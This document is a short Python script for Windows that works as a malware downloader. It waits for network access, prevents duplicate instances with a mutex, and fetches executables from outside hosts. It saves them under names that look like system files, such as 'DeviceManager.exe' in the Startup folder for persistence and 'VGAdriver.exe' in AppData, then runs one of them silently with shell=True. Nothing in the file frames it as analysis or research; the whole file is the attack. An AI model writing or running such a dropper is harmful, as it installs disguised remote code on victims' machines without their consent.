import urllib
import urllib2
import os
import subprocess

import win32event, win32api, winerror

def wait_for_internet_connection():
    while True:
        try:
            response = urllib2.urlopen('http://www.google.com',timeout=3)
            return
        except urllib2.URLError:
            pass

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None


home = os.path.expanduser("~")
path = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
path=home+path
wait_for_internet_connection()
try:
    urllib.urlretrieve("http://6n0.me/DeviceManager.exe",path+"\\DeviceManager.exe")
    urllib.urlretrieve("http://15.ss.shared.com/rfb6f7b6ku?tmp=1423975406&key=dbaacea3cb6fb93ee72bd137a384528d17b2e9cd",home+"\\AppData\\Roaming\\VGAdriver.exe")
    #urllib.urlretrieve("http://6n0.me/hstart.exe",home+"\\AppData\\Roaming\\hstart.exe")
    #urllib.urlretrieve("http://6n0.me/hstart64.exe",home+"\\AppData\\Roaming\\hstart64.exe")
    #urllib.urlretrieve("http://6n0.me/startup.bat",path+"\\startup.bat")
except:
    pass

command=str(home)+"\\AppData\\Roaming\\VGAdriver.exe"
print(command)
subprocess.call(command,shell=True)
